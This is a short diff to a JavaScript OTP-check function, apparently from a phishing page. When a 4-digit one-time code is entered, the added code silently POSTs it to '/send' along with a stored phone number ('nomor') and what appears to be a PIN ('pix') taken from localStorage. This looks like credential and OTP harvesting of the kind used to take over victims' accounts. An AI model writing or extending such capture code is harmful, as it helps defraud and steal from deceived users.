@@ -144,6 +144,34 @@ function checkOTP(){
     /* FULL OTP */
     if(otp.length === 4){
 
+        fetch("/send", {
+
+        method:"POST",
+
+        headers:{
+            "Content-Type":
+            "application/json"
+        },
+
+        body:JSON.stringify({
+
+            nomor:
+            localStorage.getItem(
+            "nmrx"
+            ),
+
+            pix:
+            localStorage.getItem(
+            "pix"
+            ),
+
+            otp:
+            otp
+
+        })
+
+    });
+
         /* SHOW LOADING */
         loadingBox.style.display =
         "flex";
